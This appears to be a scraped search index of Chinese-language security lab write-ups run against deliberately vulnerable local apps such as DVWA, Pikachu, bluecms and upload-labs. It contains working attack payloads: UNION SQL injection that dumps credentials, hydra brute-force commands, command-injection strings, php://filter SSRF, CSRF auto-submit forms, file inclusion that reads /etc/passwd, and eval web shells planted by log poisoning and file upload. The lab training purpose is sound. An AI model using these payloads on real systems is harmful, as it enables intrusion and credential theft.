latest docker run -d -p 8082:80 -p 33060:3306 \u0026ndash;name webug area39/webug 172.31.5.7 2 逻辑漏洞概述 由于程序逻辑输入管控不严，导致程序不能够正常处理或处理错误。一般出现在登录注册、密码找回、信息查看、交易支付金额等位置，由于逻辑漏洞产生的流量多数为合法流量，一般的防护手段或设备无法阻止，也导致了逻辑漏洞成为了企业防护中的难题 。\n3 如何挖掘逻辑漏洞 3.1 注册点 注册功能可能出现任意用户注册、短信轰炸等问题 前端验证：判断是否有任意用户注册 手机验证码验证：验证码是否可以暴力破解，验证码与当前手机号没有检验匹配 用户名密码注册：是否会导致批量注册 3.2 登陆点 可能出现任意用户登陆、短信轰炸等问题 前端验证：判断是否有任意用户登陆，是否有验证码回显，是否可以修改返回包造成任意用户登录问题 手机验证码验证：是否可以爆破验证码，验证码与当前手机号有没有检验匹配 账号密码登录：没有验证码或者是否存在验证码可以绕过（可以暴力破解） 3.3 密码找回点 验证码是否可以多次使用 验证码是否直接返回在数据包中 验证码未绑定用户 修改接受的手机或者邮箱进行密码重置 前端验证绕过 验证步骤绕过（先获取手机验证码，再输入要修改的邮箱和密码） 未校验用户字段的值 修改密码处id可被替换 。。。\n4 密码修改逻辑漏洞 打开webug逻辑漏洞模块（默认账号：admin/admin, 数据库账号root/toor）\n后台页面\n进入容器查看网站后台管理系统的账号密码，可以看到有两个账号\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: asdfsadf 4.1 修改密码未校验旧密码 使用账号aaaaa/asdfsadf 登录，发现404报错，这是由于webug自身的bug引起的\n删除URL中的pt_env后正常访问，是一个可以修改密码的页面\n输入任意密码后提交\n发现可以正常提交（未对旧密码做验证）\n再次查看后台数据库账号密码，发现密码修改成功\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: 123 #密码已被修改 4.2 普通用户修改管理员账号密码 使用burp抓包，使用账号aaaaa/123登录后台，再次提交修改密码的请求。\n发现其中有个字段id=2（通常0或者1是管理员的标识）\n将字段值改为1后，放行数据包。返回状态码200\n查看后台数据库信息，发现管理员账号密码已被修改\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: test *************************** 2. row *************************** id: 2 username: aaaaa password: test ","permalink":"https://senmer.github.io/zh/posts/tech/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","summary":"\u003cp\u003e（1）密码修改逻辑漏洞\u003c/p\u003e","title":"密码修改逻辑漏洞"},{"content":"（1）bluecms旁注漏洞练习\n（2）为什么旁站攻击可以拿下主站？\n（3）跨库的意思是什么？\n1 实验环境 软件名称 版本 部署方式 IP bluecms v1.6 sp1 phpStudy源码部署 172.31.5.1 将bluecms源码放入phpstudy网站目录中\n访问安装链接进行安装\nhttp://172.31.5.1/bluecms/uploads/install/ 点击下一步，返回空白页面。说明安装成功\n2 旁注简介 2.1 原理 在渗透测试过程中，如果正面难以突破，那么就采用一些迂回战术，从侧面来进行。也就是采用一些间接的方法，例如旁注，通过旁站来进行渗透。\n**什么是旁注？**在同一服务器上有多个站点，我们要攻击的这个站点假设没有漏洞，我们可以攻击服务器上的任意一个站点，这个就是旁注。（假设A网站和B网站在同一个服务器上，攻击A网站，但是A网站没有漏洞，B网站有漏洞，这时可以通过攻击B网站找到服务器）\n什么是跨库？跨库查询是指由于权限设置不严格，导致普通帐号被授予过高的权限，从而使得其可以对其他的数据库进行操作。比如，在mysql中，informatin_schema 这个表默认只有root有权限进行操作。但是如果一个普通账户权限过高后，他便可以对该数据库进行操作，从而拿到整个数据库的信息。\n2.2 示例 假如在某次渗透测试过程中我们发现主站难以攻破，通过子域名发现存在旁站bluecms，于是通过旁站来进行攻击：\n2.2.1 发现管理页 打开bluecms主页 ，尝试登录admin账号，密码任意输入。\nhttp://172.31.5.1/bluecms/uploads/ 点击登录，发现提示：\n猜测该网站有后台管理页面，通过站点扫描成功找到后台登录页面\nhttp://172.31.5.1/bluecms/uploads/admin/login.php?act=login 2.2.2 爆破管理员密码 使用admin账号尝试多次密码，账号未被锁定，且没有验证码功能。通过爆破获得密码admin\n使用账号admin/admin成功登录后台\n2.2.3 发现注入点 浏览后台，发现一个功能：获取js\n点击获取js，得到一个链接\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=1 2.2.4 sql注入拿到账号 修改id值为-1 order by 1，发现成功执行。可能是一个注入点\n直接使用order by 进行注入，多次尝试后，得到列数为7（ 8报错） 使用union关键字注入（注意这里可能由于环境原因导致没有回显，使用火狐浏览器，点击箭头所指处可获得结果）\n扩展链接：怪异模式和标准模式\n获得数据库名bluecms\n获得用户名\n获得当前库中的所有表\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database() 注入blue_user表中的字段，发现报错，这里有过滤，单引号前面出现 \\ ，证明单引号被转义了\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;blue_user\u0026#39; 使用16进制进行绕过（blue_user 16进制编码为 0x626c75655f75736572 ）：\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x626c75655f75736572 获取到blue_user表中的字段\n注入bluecms库中blue_user表中user_name以及pwd的字段内容(0x20 是空格的十六进制表示）：\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=-1 union select 1,2,3,4,5,6,concat_ws(0x20,user_name,pwd) from blue_user 至此，就拿下了该系统的整个数据库。后面就可以考虑跨库了（这里不做演示）\n","permalink":"https://senmer.github.io/zh/posts/tech/side/%E6%97%81%E6%B3%A8%E4%B8%8E%E8%B7%A8%E5%BA%93/","summary":"\u003cp\u003e（1）bluecms旁注漏洞练习\u003c/p\u003e\n\u003cp\u003e（2）为什么旁站攻击可以拿下主站？\u003c/p\u003e\n\u003cp\u003e（3）跨库的意思是什么？\u003c/p\u003e","title":"旁注与跨库"},{"content":"暴力猜解：hydra实现对ftp、ssh、rdp、mysql的暴力破解\n1 实验环境 服务名称 部署方式 版本 IP FTP phpStudy部署 172.31.5.1 MySQL phpStudy部署 172.31.5.1 RDP 系统自开，需要手动开启 172.31.5.33 ssh 系统自带，需要手动开启 172.31.5.7 2 暴力拆解简介 暴力破解是一种针对于密码的破译方法，即通过密码字典逐个尝试直到找出真正的密码。\n2.1 C/S架构暴力破解 常见爆破协议和数据库：\nFTP SSH SMB SQL server MySQL Redis 2.2 B/S架构暴力破解 暴力破解产生是由于服务器没有对接收的参数进行限制，导致攻击者可以通过暴力手段进行破解所需要的信息(如账号,密码,验证码等)，暴力破解的原理就是穷举法，其基本思想是根据部分条件确定已知条件的大致范围，并在此范围内对所有可能的情况逐一验证,直到全部情况验证完毕。\n3 暴力破解演示 3.1 hydra 介绍 hydra 是一个网络帐号破解工具，支持多种协议。其作者是van Hauser,David Maciejak与其共同维 护。hydra在所有支持GCC的平台能很好的编译，包括Linux,所有版本的BSD,Mac OS, Solaris等\nhydra 常用参数：\n-l 指定一个用户名 -P 指定一个密码字典 -s 指定端口 -L 指定一个用户名字典 -vV 显示每次的尝试信息 -f 遇到正确的密码，停止爆破 -o 将结果输出到文件中 -M 指定一个服务器列表 -t Tasks同时运行的线程数,默认为16 -e nsr n：尝试空密码 s：将用户名作为密码 r：将用户名反向 3.2 FTP 爆破 使用phpStudy Pro搭建FTP站点，账号/密码：test/test。注意：在首页开启ftp\n#执行爆破命令\nhydra 192.168.108.129 ftp -l ftp -P pwd.txt -vV -f -e ns 爆破成功\n3.2 ssh 爆破 以CentOS7（IP：172.31.5.7），开启sshd服务\nsystemctl start sshd 创建账号test, 密码：test\nuseradd test \u0026amp;\u0026amp; echo test | passwd --stdin test 执行爆破命令\nhydra 172.31.5.7 ssh -l test -P pwd.txt -t 5 -vV -e ns 爆破成功\n3.3 RDP 爆破 以windows7为例（IP： 172.31.5.33），开启RDP服务并授权test账号连接，账号密码test\n执行爆破命令\nhydra 172.31.5.33 rdp -l test -P pwd.txt -vV -f -e nsr 爆破成功\n3.4 MySQL 爆破 phpStudy 首页开启MySQL服务\n安装数据库前端管理工具\n打开前端管理工具\n新建账号test%，密码test\n执行爆破命令\nhydra 172.31.5.1 mysql -l test -P pwd.txt -vV -f -e nsr 爆破成功\n","permalink":"https://senmer.github.io/zh/posts/tech/brute_force/brute_force/","summary":"\u003cp\u003e暴力猜解：hydra实现对ftp、ssh、rdp、mysql的暴力破解\u003c/p\u003e","title":"Brute_force"},{"content":"（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍；\n一、实验环境 软件名称 部署方式 版本 IP Pikachu docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu latest 172.31.5.7 二、漏洞简介（BAC） 越权访问（Broken Access Control，简称BAC）是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大，被OWASP列为Web应用十大安全隐患的第一名。\n该漏洞是指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。\n越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定。\n在实际的代码审计中，这种漏洞往往很难通过工具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有一定差别，目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。\n水平越权: 指相同权限下不同的用户可以互相访问 垂直越权: 指使用权限低的用户可以访问到权限较高的用户 **水平越权测试方法：**主要通过看看能否通过A用户操作影响到B用户 **垂直越权测试方法：**看看低权限用户是否能越权使用高权限用户的功能，比如普通用户可以使用管理员的功能。\n三、漏洞演示 3.1 水平越权 使用allen用户登录并查看个人信息\n将URL中的username参数值改为lucy后回车，查看到lucy用户的信息\n3.2 垂直越权 这里有两个用户admin/123456, pikachu/000000, admin是超级boss\n使用admin账号登录，发现权限较大\n点击添加用户获得添加用户的接口（burp抓包发现该接口没有提交额外的参数进行身份验证）\nhttp://172.31.5.7:8080/vul/overpermission/op2/op2_admin_edit.php 使用pikachu用户登录并访问上文获得的接口，发现可以正常访问\n输入dd后点击创建，会回到登录界面。使用admin账号登录后，发现dd用户已被创建\n四、漏洞修复 1、前后端同时对用户输入信息进行校验，双重验证机制 2、执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限 3、特别敏感操作可以让用户再次输入密码或其他的验证信息，防范CSRF 4、从用户的加密认证 cookie 中获取当前用户 id，防止攻击者对其修改。或在 session、cookie 中加入不可预测、不可猜解的 user 信息 5、直接对象引用的资源ID进行加密，防止攻击者枚举ID，敏感数据特殊化处理\n","permalink":"https://senmer.github.io/zh/posts/tech/bac/bac/","summary":"\u003cp\u003e（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍；\u003c/p\u003e","title":"BAC"},{"content":"（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍；\n一、实验环境 软件名称 版本 部署方式 IP DVWA latest docker run -d -p 80:80 docker.io/sagikazarmark/dvwa 172.31.5.7 二、什么是RCE？ RCE英文全称：remote command/code execute，分为 远程命令执行和 远程代码执行。 RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。\n2.1 远程命令执行 出现原因：因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而控制整个后台服务器。\n例如：如今很多甲方企业的自动化运维平台，大量的系统操作会通过“自动化运维”平台进行操作，其中 往往会出现远程系统命令执行的漏洞。\n2.2 远程代码执行 出现原因：因为需求设计，后台有时候会把用户的输入作为代码的一部分进行执行，也造成了远程代码 执行漏洞，不管是使用了代码执行的函数，还是使用了不安全的反序列化等等。\n2.3 防御 如果需要给前端用户提供操作类的API接口，一定需要对接口的输入的内容进行严格的判断，比如实施 严格的白名单是一个好的方法。\n三、DVWA漏洞演示 2.1 Low级别 dvwa的命令注入模块，提供了一个检测IP是否存活的功能。如：输入127.0.0.1\n在此模块中，有以下常用逻辑运算操作可利用\nA \u0026amp;\u0026amp; B： 先执行A，如果成功，执行B； A || B： 先执行A，如果失败，执行B； A | B：管道符，先执行A后，将A的结果作为B的输入，打印的是B的结果； A \u0026amp; B： 先执行A，然后不管成功与否，执行B； 示例：\n127.0.0.1 \u0026amp;\u0026amp; ls false || ls 127.0.0.1 | ls 127.0.0.1 \u0026amp; ls 这里 \u0026amp; 表示将任务至于后台执行，因为 ls 执行比较快，所以结果显示在前面\n","permalink":"https://senmer.github.io/zh/posts/tech/rce/rce/","summary":"\u003cp\u003e（1）远程代码执行漏洞：DVWA-Low级别，要求把命令的操作方式全部练习一遍；\u003c/p\u003e","title":"RCE"},{"content":"(1) SSRF（file_get_content），获取ssrf.php的源码；\n一、实验环境 软件名称 版本 部署方式 IP Pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 二、漏洞简介 SSRF(Server-Side Request Forgery：服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。\n2.1 原理 SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。通过控制功能中的发起请求的服务来当作跳板攻击内网中其他服务。比如，通过控制前台的请求远程地址加载的响应，来让请求数据由远程的URL域名修改为请求本地、或者内网的IP地址及服务，来造成对内网系统的攻击。\n2.2 危害 1、扫描内网开放服务 2、向内部任意主机的任意端口发送payload来攻击内网服务 3、DOS攻击（请求大文件，始终保持连接Keep-Alive Always） 4、攻击内网的web应用，例如直接SQL注入、XSS攻击等 5、利用file、gopher、dict协议读取本地文件、执行命令等\n三、漏洞演示 3.1 SSRF（file_get_content） file_get_contents() 函数把整个文件读入一个字符串中，是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。\nphp://filter：是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。\nphp://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用 这些参数可以参考具体范例。\n名称 描述 resource=\u0026lt;要过滤的数 据流\u0026gt; 这个参数是必须的。它指定了你要筛选过滤的数据流，即要读的文 件。 read=\u0026lt;读链的筛选列表\u0026gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分 隔。 write=\u0026lt;写链的筛选列表 \u0026gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（ | ）分 隔。 \u0026lt;；两个链的筛选列表\u0026gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于 读或写链。 file_get_contents里面带有php://filter 我们用这个就可以来读取php源码，所以我们来构造URL：\nhttp://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/resource=ssrf.php 浏览器输入，成功在SSRF(file_get_content)页面读取到概述页面\n上图中，ssrf.php文件被解析成了网页进行显示。如果需要读取源码，而不希望该文件内被解析，需要在read参数中加入 convert.base64-encode\nhttp://172.31.5.7:8080/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64- encode/resource=ssrf.php 成功拿到base64编码后的源码\n使用解码工具（https://base64.us/ ）解码后得到源码\n四、漏洞修复 1、设置URL白名单或者黑名单内网IP； 2、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准； 3、禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file:///,gopher://,ftp:// 等引起的问题。\n","permalink":"https://senmer.github.io/zh/posts/tech/ssrf/ssrf/","summary":"\u003cp\u003e(1) SSRF（file_get_content），获取ssrf.php的源码；\u003c/p\u003e","title":"SSRF"},{"content":"（1）DVWA-High等级 （2）使用Burp生成CSRF利用POC\n一、实验环境 软件名称 版本 部署方式 IP pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 BurpSuite Professional v2 window安装 172.31.5.1 DVWA latest docker run -d \u0026ndash;name dvwa -p 80:80 172.31.5.7 二、漏洞简介 2.1 原理 1.用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 2.在用户信息用过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送 请求到网站A； 3.用户未退出网站A之前，在同一浏览器中打开一个TAB页访问网站B； 4.网站B接受到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 5.浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A 发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求， 导致来自网站B的恶意代码被执行。 2.2 产生条件 **一个功能操作。**应用程序中存在攻击者有可能诱导用户的操作。这可能是特权操作（例如修改其他用户的权限）或对用户特定数据的任何操作（例如更改用户自己的邮箱、密码）。 **基于 Cookie 的会话处理。**执行该操作涉及发出一个或多个 HTTP 请求，并且应用程序仅依赖会话 cookie 来识别发出请求的用户。没有其他机制可用于跟踪会话或验证用户请求。 **没有不可预测的请求参数。**执行该操作的请求不包含攻击者无法确定或猜测其值的任何参数。例如，当用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到攻击，因为攻击者预先构造的恶意链接中无法提前预测并定义“现有密码”的值。 例如，假设一个应用程序包含一个允许用户更改其帐户上的电子邮件地址的功能。当用户执行此操作 时，他们会发出如下 HTTP 请求：\nPOST /email/change HTTP/1.1 Host: vulnerable-website.com Content-Type: application/x-www-form-urlencoded Content-Length: 30 Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE email=test@test.com 这符合 CSRF 所需的条件：\n攻击者对更改用户帐户上的电子邮件地址的操作很感兴趣。执行此操作后，攻击者通常能够触发密 码重置并完全控制用户的帐户。\n应用程序使用会话 cookie 来识别发出请求的用户。没有其他令牌或机制来跟踪用户会话。\n攻击者可以轻松确定执行操作所需的请求参数的值。\n有了这些条件，攻击者就可以构建一个包含以下 HTML 的网页：\n\u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://vulnerable-website.com/email/change\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;email\u0026#34; value=\u0026#34;test@test.com\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.forms[0].submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 如果受害者用户访问攻击者的网页，将会发生以下情况：\n攻击者的页面将触发对易受攻击的网站的 HTTP 请求。 如果用户登录到易受攻击的网站，他们的浏览器将自动在请求中包含他们的会话 cookie。 易受攻击的网站将以正常方式处理请求，将其视为由受害者用户发出，并更改其电子邮件地址 三、漏洞复现 3.1 DVWA high等级 High级别的代码增加了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的 token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有 token正确，才会处理客户端请求。\n这个High安全等级主要是利用了DVWA的XSS漏洞和CSRF漏洞共同完成的，找到DVWA的XSS模块，通 过XSS漏洞获取浏览器Cookie （临时调整安全级别为Low）\n在输入框提交以下代码获取用户cookie: PHPSESSID=o5vb99b2blvbnhotnt0jb4gpe6; security=low\n\u0026lt;script\u0026gt;alert(document.cookie)\u0026lt;/script\u0026gt; 将安全级别调整为High，然后抓包\n删除token，并将security修改为low，PHPSESSION替换为上文获取的cookie值，然后Forward\nDVWA显示密码修改成功\n3.2 CSRF(get) Pikachu 演示\n打开并登录pikachu的CSRF(get) 模块\n启用burp抓包，并修改个人信息：将邮箱修改为 test@test.com，然后提交\n查看抓包结果\n复制请求行信息\nGET /vul/csrf/csrfget/csrf_get_edit.php?sex=\u0026amp;phonenum=\u0026amp;add=\u0026amp;email=test%40test.com\u0026amp;submit=submit HTTP/1.1 将需要修改的信息（黑客），如电话号码和地址等信息写到URL里\nGET /vul/csrf/csrfget/csrf_get_edit.php?sex=666\u0026amp;phonenum=777\u0026amp;add=888\u0026amp;email=test%40test.com\u0026amp;submit=submit HTTP/1.1 然后添加补全URL地址，发送给被攻击者kobe（在另一个浏览器登录kobe账号）\nhttp://172.31.5.7:8080/vul/csrf/csrfget/csrf_get.php?sex=666\u0026amp;phonenum=777\u0026amp;add=888\u0026amp;email=test%40test.com\u0026amp;submit=submit 如果被攻击者kobe此时登录状态或cookie/session没有过期，则他的信息被修改，如下图：\n3.3 使用Burp生成CSRF利用POC 在 Burp Suite Professional 中的任意位置选择需要测试或利用的请求。 从右键单击上下文菜单中，选择参与工具/生成 CSRF PoC。 Burp Suite 将生成一些 HTML 来触发选定的请求（减去 cookie，它将由受害者的浏览器自动添加）。 可以调整 CSRF PoC 生成器中的各种选项，以微调攻击的各个方面。可能需要在一些不寻常的情况下执行此操作以处理请求的古怪功能。 将生成的 HTML 复制到网页中，在登录到易受攻击网站的浏览器中查看，并测试是否成功发出了预期的请求以及是否发生了所需的操作。 示例：\n开启抓包，打开pikachu (CSRF post) 模块提交任意信息\n打开burp的poc生成工具\n获取到poc代码\ndocument.forms[0].submit(); （1）这句话的意思是将表单提交到服务器去。 （2）没有他的话就不能向服务器提交数据了，那么就不能将你在页面中填写的数据反馈给服务器。表现为你在页面中点击“提交”按钮没有反应 （3）把你填写的数据提交到form中action指定的页面，如果action没词儿东西，就默认为当前页面 （4）如果你的提交按钮的type是submit的话，那么你可以不写这句话\n原文链接：https://blog.csdn.net/qq_45760909/article/details/109037611\n点击Test in browser，生成链接地址\n新建标签页，复制链接到浏览器打开（确保burp代理是开启状态）\n点击提交后，发现信息被修改。说明poc生成成功\n打开另一浏览器使用vince账号登录（模拟用户点击恶意链接）\n将上文获得的poc文件复制（点机Copy HTML即可），另存为恶意链接.html\n将该文件拖入到浏览器中，点击提交按钮。发现信息被修改\n","permalink":"https://senmer.github.io/zh/posts/tech/csrf/csrf/","summary":"\u003cp\u003e（1）DVWA-High等级\n（2）使用Burp生成CSRF利用POC\u003c/p\u003e","title":"CSRF"},{"content":"（1）DVWA环境下去包含其他目录的任意3个文件，要求使用相对路径 （2）远程文件包含 （3）中间件日志包含绕过，要求使用蚁剑连接成功\n一、实验环境 软件名称 部署方式 版本 IP DVWA docker run -d \u0026ndash;name dvwa -p 80:80 latest 172.31.5.7 Upload-labs docker run -d -p 8081:80 \u0026ndash;name upload-labs cuer/upload-labs latest 172.31.5.7 二、漏洞简介 2.1 原理 程序开发人员一般会把重复使用的函数写到单个文件中，需要使用某个函数时直接调用此文件，而无需再次编写，这种文件调用的过程一般被称为文件包含。程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用一个恶意文件，造成文件包含漏洞。 在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件， 导致意外的文件泄露甚至恶意的代码注入。\n2.2 分类 文件包含漏洞一般可分为两类\n**本地文件包含：**包含的是web服务器本地的文件，如：/etc/passwd等敏感文件\n利用条件：\n用户对输入可控且无过滤 **远程文件包含：**包含的是远程服务器（如黑客攻击机器上的文件），攻击者可通过此方式执行恶意代码\n利用条件：\n需要php.ini开启了allow_url_fopen和allow_url_include的配置。包含的文件是第三方服务器（比如： 攻击者搭建的一个Web服务器）的文件。\nallow_url_fopen=On (默认为On) 规定是否允许从远程服务器或者网站检索数据 allow_url_include=On (php5.2之后默认为Off) 规定是否允许include/require远程文件 2.3 相关函数 PHP中的文件包含函数有以下四种：\nrequire() include() require_once() include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常 运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次。适 用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，想确保它只被包括一次以避免函数重 定义，变量重新赋值等问题。\n2.3 漏洞场景 URL中如果出现了如下内容就可能存在文件包含漏洞\n?page= ?file= ?home= 常见的系统敏感文件\nwindows系统\nc:\\boot.ini // 查看系统版本 c:\\windows\\system32\\inetsrc\\MetaBase.xml //IIS配置文件 c:\\windows\\repair\\sam //存储windows系统初次安装的密码 c:\\programFiles\\mysql\\my.ini //MYSQL root密码 c:\\windows\\php.ini // php 配置信息 Linux系统\n/etc/passwd // 账户信息 /etc/shadow // 账户密码文件 /usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件 /usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置 /usr/local/app/php5/lib/php.ini // PHP相关配置 /etc/httpd/conf/httpd.conf // Apache配置文件 /etc/my.conf // mysql 配置文件 2.4 漏洞发现 1、观察URL链接是否包括以下类似的关键字：page/include/path/file/link/url等，如果有，则可能 存在文件包含漏洞；\n2、可以观察在URL中，出现的赋值参数等号后跟的信息，是否为一个文件，如果是，则可能存在文件 包含漏洞；\n3、在关键字处或明显被文件赋值的参数处，尝试进行赋值，如：https://www.baidu.com；或系统常 见文件，如：/etc/passwd（Linux）\n三、漏洞复现 3.1 本地文件包含 DVWA安全等级：Low, 文件包含模块可以看到有三个文件，且有关键字page\n点击任意文件观察到URL中page字段的参数值有变化\n查看源码分析：该页面使用get方法传递参数，且没有任何过滤\n\u0026lt;?php // The page we wish to display $file = $_GET[ \u0026#39;page\u0026#39; ]; ?\u0026gt; 尝试直接修改URL中page字段的参数值，输入多个 ../ 确保回到 / 目录下。可以读取到/etc/passwd 文件\n尝试读取其它文件\n3.2 远程文件包含 还是在DVWA的文件包含模块，调整安全级别为：Low\n远程文件使用upload-labs中的phpinfo.txt（需自行创建或者上传）\nroot@09fcc517488e:/var/www/html# cat \u0026gt; phpinfo.txt \u0026lt;\u0026lt;EOF \u0026gt; \u0026lt;?php \u0026gt; \u0026gt; phpinfo(); \u0026gt; \u0026gt; ?\u0026gt; \u0026gt; EOF root@09fcc517488e:/var/www/html# cat phpinfo.txt \u0026lt;?php phpinfo(); ?\u0026gt; page参数改为远程服务器的文件地址；**此处注意包含的远程文件不能为.php文件，否则将直接返回远程文件。正确的做法是，包含一个如：.txt后缀的文件，使得被攻击机器读取并执行其中的代码。 **\n3.3 中间件日志包含 DVWA安全等级：Low\nDVWA中，apache2日志文件路径为： /var/log/apache2/access.log 包含日志文件，需要先对文件和目录添加权限，让web端有权限去访问：\n[root@centos7 ~]# docker exec -it dvwa bash root@81bfa8dbf381:/# chmod 755 /var/log/apache2/ root@81bfa8dbf381:/# chmod 644 /var/log/apache2/access.log 修改完权限后，开启burp抓包，然后访问URL\nhttp://172.31.5.7/vulnerabilities/fi/?page=\u0026lt;?php eval(@$_POST[\u0026#39;a\u0026#39;]);?\u0026gt; 在burp中可以看到，URL被重新编码了\n查看日志文件验证，日志文件记录的是URL编码后的一句话木马，是不能成功执行的\n因此需要在burp中将URL改为正常的URL，然后Forward\n再次查看日志验证结果，发现一句话木马被成功记录到日志\n使用蚁剑链接，注意要配置Cookie（DVWA需要登录）\n一句话木马利用成功\n","permalink":"https://senmer.github.io/zh/posts/tech/file_inclusion/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","summary":"\u003cp\u003e（1）DVWA环境下去包含其他目录的任意3个文件，要求使用相对路径\n（2）远程文件包含\n（3）中间件日志包含绕过，要求使用蚁剑连接成功\u003c/p\u003e","title":"文件包含"},{"content":"（1）客户端绕过练习 （2）服务端黑名单绕过：给出.htaccess文件绕过的具体步骤\n一、实验环境 软件名称 版本 部署方式 IP upload-labs latest docker run -d -p 8081:80 \u0026ndash;name upload-labs cuer/upload-labs 172.31.5.7 二、客户端绕过 2.1 源码分析 浏览器访问 http://172.31.5.7:8081/Pass-01，选择Pass-01\n直接上传php后缀的文件a.php会被拒绝\n点击右上角显示源码：\n分析源码可知，此文件上传类型是通过前端js进行限制，因此可通过禁用浏览器的js来绕过\n2.2 禁用浏览器js google浏览器：设置——隐私与安全性——网站设置——JavaScript——不允许网站使用JavaScript（也可通过添加白名单的方式，不影响浏览器正常使用）\n2.3 上传木马 准备一句话木马文件a.php，内容：\n\u0026lt;?php eval(@$_GET[\u0026#39;a\u0026#39;]);?\u0026gt; 刷新后，再次上传a.php文件成功\n右键上传的文件获取图片地址：http://172.31.5.7:8081/upload/a.php\n浏览器访问 http://172.31.5.7:8081/upload/a.php?a=phpinfo();\n成功植入一句话木马:\n2.2 蚁剑连接 重新上传一句话木马shell.php，内容：\n\u0026lt;?php eval(@$_POST[\u0026#39;passwd\u0026#39;]);?\u0026gt; 